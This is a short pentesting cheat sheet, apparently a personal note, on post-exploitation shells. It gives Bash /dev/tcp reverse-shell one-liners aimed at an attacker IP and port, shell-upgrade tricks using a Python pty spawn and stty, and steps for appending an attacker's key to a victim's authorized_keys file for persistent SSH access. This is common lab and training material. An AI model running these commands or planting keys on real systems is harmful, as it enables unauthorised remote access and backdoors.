# Shells

Always remember to check your IP: [[Linux Networking#Get your IP]]

## Bash Reverse

```bash
bash -i >& /dev/tcp/[IP]/[PORT] 0>&1
```

or

```bash
bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'
```

## Upgrading a Shell

Often, you can simply run `/bin/bash` or equivalent to launch a better shell.

Use `echo "$SHELL"` to determine the shell you're using. Then specify the full path to that shell and it will sometimes spawn you a better, more interactive shell.

```bash
┌──(mac㉿kali)-[~]
└─$ echo "$SHELL"
/bin/bash
┌──(mac㉿kali)-[~]
└─$ /bin/bash
```

### Using Python to spawn /bin/bash

```bash
which bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Backgrounding Shell Trick

Within your shell, possibly after spawning a `/bin/bash` process with python, do the following to fix the interactivity in your shell:

- Press `Ctrl + z` to background the process
- Execute the command `stty raw -echo` on your host machine
- Type `fg` on your host (you will not see this on screen)
- Press the `Enter` key twice

You should now have an interactive shell!

You can then run `export TERM=xterm` to allow clearing the terminal.

If your line wrapping seems off, you may need to recalibrate the columns and rows in your new shell. Do the following:

- Execute `stty -a` on your host machine and make a note of the rows and columns number
- In your new shell, execute `stty rows Y cols X` where Y is your number of rows and X is your number of columns

*Note:* This does not work in meterpreter or metasploit shells in general.

### Use your shell to write an SSH key

This is one of the most reliable ways of getting an interactive shell - if you have permissions to pull it off.

First, generate a key pair to use to access the box (do this on your host machine):

```bash
$ ssh-keygen -f key_name
```

Then read the public key and copy it to your clipboard:

```bash
$ cat key_name.pub
```

On the victim box, find the user you would like to remotely access - in this example, `victim`:

```bash
$ echo 'CONTENTS_OF_KEY' >> /home/victim/.ssh/authorized_keys
```

Then ssh in from your host:

```bash
ssh -i key_name victim@IP_ADDRESS
```

### Girsh

[Repo link](https://github.com/nodauf/Girsh)

# Tags

#cheat-sheet #unix